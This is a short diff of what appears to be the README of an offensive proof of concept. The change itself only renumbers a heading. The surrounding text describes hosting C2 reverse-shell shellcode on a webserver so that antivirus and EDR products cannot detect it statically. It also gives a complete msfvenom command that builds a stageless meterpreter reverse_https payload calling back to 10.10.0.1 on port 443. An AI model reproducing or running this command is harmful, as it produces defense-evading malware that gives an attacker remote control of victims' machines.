@@ -16,7 +16,9 @@ By that POC we have the advantage, that the shellcode for the C2 reverse shell i
 Trought that we don't have the problem of statically detection of the C2 shellcode by an AV/EPP/EDR, because the shellcode is hosted 
 on a webserver. 
 
-**Creating Stageless Shellcode with MSF-Venom**
+
+
+**1. Creating Stageless Shellcode with MSF-Venom**
 **kali>** msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.0.1 LPORT=443 -f c --arch x64 --platform windows -o /tmp/meterx64.c
 
 ![image](https://user-images.githubusercontent.com/50073731/160273773-3835a406-3500-43fd-b895-5f34e04188be.png)
